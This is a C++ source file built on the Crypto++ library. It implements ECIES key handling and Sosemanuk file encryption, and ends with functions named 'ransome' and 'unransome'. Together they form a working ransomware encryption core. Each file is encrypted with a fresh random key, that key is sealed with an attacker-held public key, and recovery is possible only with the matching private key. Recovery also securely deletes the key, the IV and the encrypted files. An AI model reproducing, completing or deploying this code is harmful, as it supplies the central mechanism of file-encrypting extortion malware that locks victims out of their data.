#include "cryptopp/files.h"
#include "cryptopp/hex.h"
#include "cryptopp/filters.h"
#include "cryptopp/osrng.h"
#include "cryptopp/integer.h"
#include "cryptopp/pubkey.h"
#include "cryptopp/eccrypto.h"
#include "cryptopp/pubkey.h"
#include "cryptopp/asn.h"
#include "cryptopp/oids.h"
#include "cryptopp/cryptlib.h"
#include "cryptopp/base64.h"
#include "cryptopp/whrlpool.h"
//#include "cryptopp/aes.h"
#include "cryptopp/modes.h"
//#include "cryptopp/fhmqv.h"
#include "cryptopp/oids.h"
#include "cryptopp/asn.h"
//#include "cryptopp/rc6.h"
#include "cryptopp/sosemanuk.h"
#include "cryptopp/sha3.h"
#include "cryptopp/sha.h"

#include "config.h"

#include "gutman.h"


using namespace std;
using namespace CryptoPP;

//Check String Base16 
int Isb16(string &stl)
{	
	string b16=" 0123456789ABCDEF";
	int i,k;
	k=0;
	for(i=0;i<stl.size();i++){
		if (b16.find(stl[i]))
		  k++;
		else{
			cerr << "Bad String Hex " << endl;
			return 1;		
		}
	}
	if(stl.size()!=k){
		cerr << "Bad String Hex " << endl;
        return 1;
	}
	
	return 0;
}

//Check String Base64
int Isb64(string &stl)
{
	string b64=" ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
	int i,k;
	k=0;
	for(i=0;i<stl.size();i++){
		if (b64.find(stl[i]))
		  k++;
		 else{
			cerr << "Bad String Base64 " << endl;
			return 1;		
		}
	}
	if(stl.size()!=k){ 
		cerr << "Bad String Base64 " << endl;
        return 1;
	}
	return 0;
}


int SavePriv64(string& filename,const PrivateKey& key)
{	
	AutoSeededRandomPool prng;
	if (false == key.Validate (prng, 3)){        
     cerr<<"Private key validation failed"<<endl;
     return 1;      
	}
		
	string stl1;

	try{
		StringSink stl2(stl1);
		key.Save(stl2);
		StringSource s(stl1,true,new Base64Encoder(new FileSink(filename.c_str())));
	}
	
	catch(const CryptoPP::Exception& e){ 
		cerr << e.what() << endl;
		cerr << "Fail Save Ec Private Key " << endl;
        return 1;
	}
	return 0;
	
}

int LoadPriv64(string& filename,PrivateKey& key)
{	
	AutoSeededRandomPool prng;
	string stl;
	try{	
		FileSource s(filename.c_str(),true,new Base64Decoder( new StringSink(stl))); 
		StringSource source(stl, true);
		key.Load(source);
	}
	catch(const CryptoPP::Exception& e){ 
		cerr << e.what() << endl;
		cerr << "Fail Load Ec Public key " << endl;
        return 1;
	}
	
	if (false == key.Validate (prng, 3)){        
     cerr<<"Private key validation failed"<<endl;
     return 1;      
	}
		
    return 0;
    			
}


int SavePub64(string& filename ,const PublicKey& key )
{	
	AutoSeededRandomPool prng;
	if (false == key.Validate (prng, 3)){        
     cerr<<"Private key validation failed"<<endl;
     return 1;      
	}
	
	string stl1;
    try{
		StringSink stl2(stl1);
		key.Save(stl2);
		StringSource s(stl1,true, new Base64Encoder(new FileSink(filename.c_str())));
	}
	catch(const CryptoPP::Exception& e){ 
		cerr << e.what() << endl;
		cerr << "Fail Save Ec Public key " << endl;
        return 1;
	}
	
	return 0;		
}


int LoadPub64(string& filename,PublicKey& key)
{	
	AutoSeededRandomPool prng;
	string stl;
	try{	
		FileSource s(filename.c_str(),true,new Base64Decoder( new StringSink(stl))); 
		StringSource source(stl, true);
		key.Load(source);
	}
	catch(const CryptoPP::Exception& e){ 
		cerr << e.what() << endl;
		cerr << "Fail Load Ec Public key " << endl;
        return 1;
	}
	
	if (false == key.Validate (prng, 3)){        
     cerr<<"Private key validation failed"<<endl;
     return 1;      
	}
		
    return 0;
    			
}


int Sha3s(string& str, string& digest)
{	
	digest.clear();
	try{
		SHA3_512 hash;
		StringSource h1(str, true, new HashFilter(hash,new HexEncoder(new StringSink(digest))));
	}	
	catch(const CryptoPP::Exception& d){ 
		cerr << d.what() << endl;
		cerr << "Fail Sha1 " << endl;
        return 1;
	}
	return 0;
}


int ShaPriv(string& digest,const PrivateKey& key)
{	
	AutoSeededRandomPool prng;
	if (false == key.Validate (prng, 3)){        
     cerr<<"Private key validation failed"<<endl;
     return 1;      
	}
		
	string stl1,stl3;

	try{
		StringSink stl2(stl1);
		key.Save(stl2);
		SHA hash;
		//StringSource s(stl1,true,new Base64Encoder(new FileSink(filename.c_str())));
		StringSource h1(stl1, true, new HashFilter(hash,new HexEncoder(new StringSink(digest))));
	}
	
	catch(const CryptoPP::Exception& e){ 
		cerr << e.what() << endl;
		cerr << "Fail Save Ec Private Key " << endl;
        return 1;
	}
	return 0;
	
}

int Sosemanukgen(string& skey,string& siv )
{
	skey.clear();
	siv.clear();
	try{
		AutoSeededRandomPool prng;
		byte key[Sosemanuk::MAX_KEYLENGTH]; 
		byte iv[Sosemanuk::IV_LENGTH];	
	
		prng.GenerateBlock(iv, sizeof(iv));
		prng.GenerateBlock(key, sizeof(key));
		
		StringSource sk(key, sizeof(key), true, new HexEncoder(new StringSink(skey) )); 
		StringSource si(iv, sizeof(iv), true, new HexEncoder(new StringSink(siv))); 
	}
	catch(const CryptoPP::Exception& e){ 
		cerr << e.what() << endl;
        cerr << "Fail Sosemanuk Key Generation " << endl;
        return 1;
	}
	return 0;
}

int Sosemanukc(string& stl, string& stl2,string& skey,string& siv)
{		
	if(Isb16(skey)!=0)
		return 1;
		
	if(Isb16(siv)!=0)
		return 1;
		
	AutoSeededRandomPool prng;
	byte key[Sosemanuk::MAX_KEYLENGTH]; 
	byte iv[Sosemanuk::IV_LENGTH];		
    string ekey,eiv;
    
    StringSource sk(skey, true, new HexDecoder(new StringSink(ekey) )); 
	StringSource si(siv, true, new HexDecoder(new StringSink(eiv)));  
    
    if(ekey.size()!=Sosemanuk::MAX_KEYLENGTH){
		cout<<"Bad key size"<<endl;
		return 1;
	}
    
    if(eiv.size()!=Sosemanuk::IV_LENGTH){
		cout<<"Bad iv size"<<endl;
		return 1;
	}
    
    
    memcpy( key, ekey.data(),Sosemanuk::MAX_KEYLENGTH);
    memcpy( iv, eiv.data(),Sosemanuk::IV_LENGTH);	
	
	try{ 	
		Sosemanuk::Encryption e(key, sizeof(key), iv);     
		FileSource s(stl.c_str(),true, new StreamTransformationFilter(e,new FileSink(stl2.c_str())));
	}
	catch(const CryptoPP::Exception& e){ 
		cerr << e.what() << endl;
		cerr << "Fail Sosemanuk Encryption " << endl;
        return 1;
	}	
	
	return 0;
	
}

int Sosemanukd(string& stl, string& stl2,string& skey,string& siv)
{		
	if(Isb16(skey)!=0)
		return 1;
		
	if(Isb16(siv)!=0)
		return 1;
		
	AutoSeededRandomPool prng;
	byte key[Sosemanuk::MAX_KEYLENGTH]; 
	byte iv[Sosemanuk::IV_LENGTH];		
    string ekey,eiv;
    
    StringSource sk(skey, true, new HexDecoder(new StringSink(ekey) )); 
	StringSource si(siv, true, new HexDecoder(new StringSink(eiv)));  
    
    if(ekey.size()!=Sosemanuk::MAX_KEYLENGTH){
		cout<<"Bad key size"<<endl;
		return 1;
	}
    
    if(eiv.size()!=Sosemanuk::IV_LENGTH){
		cout<<"Bad iv size"<<endl;
		return 1;
	}
    
    
    memcpy( key, ekey.data(),Sosemanuk::MAX_KEYLENGTH);
    memcpy( iv, eiv.data(),Sosemanuk::IV_LENGTH);	
    
	try{ 	
		Sosemanuk::Decryption sdec(key, sizeof(key), iv);
		FileSource s(stl.c_str(),true, new StreamTransformationFilter(sdec,new FileSink(stl2.c_str())));


	}
	catch(const CryptoPP::Exception& e){ 
		cerr << e.what() << endl;
		cerr << "Fail Sosemanuk Decryption " << endl;
        return 1;
	}
	
	return 0;
	
}

int Eciese(string& file,string& str){
	
	CryptoPP::AutoSeededRandomPool prng;
	CryptoPP::ECIES < CryptoPP::ECP >::PublicKey e0;
	
	string kname=DNAME;
	kname.append(KNAME);
	kname.append(".pub");


	if (LoadPub64(kname,e0)!=0)
		return 1;
	
	try{	
		CryptoPP::ECIES < CryptoPP::ECP >::Encryptor Encryptor (e0);    
		StringSource ss1 (str, true, new PK_EncryptorFilter(prng, Encryptor,new Base64Encoder( new FileSink(file.c_str())) ) );

	}
	catch(const CryptoPP::Exception& e){ 
		cerr << e.what() << endl;
		cerr << "Fail str Enryption " << endl;
        return 1;
	}
	
	return 0;
}


int Eciesd(string& file,string& str){
	
	CryptoPP::AutoSeededRandomPool prng;
	CryptoPP::ECIES < CryptoPP::ECP >::PrivateKey d0;    

	string kname=DNAME;
	kname.append(KNAME);
	kname.append(".priv");

	if (LoadPriv64(kname,d0)!=0)
		return 1;
	try{	
		CryptoPP::ECIES < CryptoPP::ECP >::Decryptor Decryptor (d0);
		FileSource ss2 (file.c_str(), true,new Base64Decoder( new PK_DecryptorFilter(prng, Decryptor,new StringSink(str))));

	}
	catch(const CryptoPP::Exception& e){ 
		cerr << e.what() << endl;
		cerr << "Fail str Decryption " << endl;
        return 1;
	}	
	
	return 0;
}


////////////////////////////////////////////////////////////////////////
int ransome (const string& file){
	
	string filee=file,filend=file;
	filend.append(".mel");

	string key, iv;
	Sosemanukgen(key,iv);
	Sosemanukc(filee,filend,key,iv);
	
	filend.erase (filend.end()-4, filend.end());	
	filend.append(".key");	
	Eciese(filend, key);
			
	filend.erase (filend.end()-4, filend.end());	
	filend.append(".iv");
	//Eciese(filend, iv);
	StringSource ss1 (iv, true, new FileSink(filend.c_str()));
	
	
	return 0;
}

int unransome(const string& file){
	
	string filee=file,filend=file;
	filend.erase (filend.end()-4, filend.end());
	
	string key, iv;
	filend.append(".key");
	Eciesd(filend, key);
	srfdel(filend.c_str());
	
	filend.erase (filend.end()-4, filend.end());	
	filend.append(".iv");
	//Eciese(filend, iv);
	FileSource ss1 (filend.c_str(), true, new StringSink(iv));
	srfdel(filend.c_str());
	
	filend.erase (filend.end()-3, filend.end());
	Sosemanukd(filee,filend,key,iv);
	srfdel(filee.c_str());
		
	return 0;
}	
